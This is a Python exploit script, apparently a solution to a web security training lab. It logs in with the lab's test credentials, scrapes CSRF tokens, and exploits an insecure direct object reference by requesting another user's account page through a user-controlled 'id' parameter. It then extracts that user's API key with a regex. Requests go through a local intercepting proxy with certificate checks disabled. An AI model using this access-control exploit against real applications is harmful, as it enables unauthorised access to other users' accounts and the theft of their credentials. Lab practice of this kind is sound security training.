import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, url):
    res = session.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, 'html.parser')
    csrf = soup.find("input", {'name': 'csrf'})["value"]
    return csrf

def carlos_api_key(session, url):
    # Get csrf token 
    login_url = url + "/login"
    csrf_token = get_csrf_token(session, login_url)

    #Login as the wiener user
    print("(+) Logging in as the wiener user...")
    login_data = {'csrf': csrf_token, 'username': 'wiener', 'password': 'peter'}
    res = session.post(login_url, data=login_data, verify=False, proxies=proxies)

    if "Log out" in res.text:
        print("(+) Successfully logged in as the wiener user.")

        # Access the carlos account
        print("(+) Attempting to exploit access control vulnerabilities...")
        carlos_account_url = url + "/my-account?id=carlos"
        res = session.get(carlos_account_url, allow_redirects=False, verify=False, proxies=proxies)
        
        if "carlos" in res.text:
            print("(+) Retrieving API key...")
            api_key = re.findall(r"Your API Key is: (.*)</div>", res.text)[0]
            print(f"(+) API Key is: {api_key}")
        else:
            print('(-) Could not exploit access control vulnerabilities..')
            sys.exit(-1)

    else:
        print("(-) Could not login as wiener user.")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    session = requests.session()
    url = sys.argv[1].strip()
    carlos_api_key(session, url)

if __name__ == "__main__":
    main()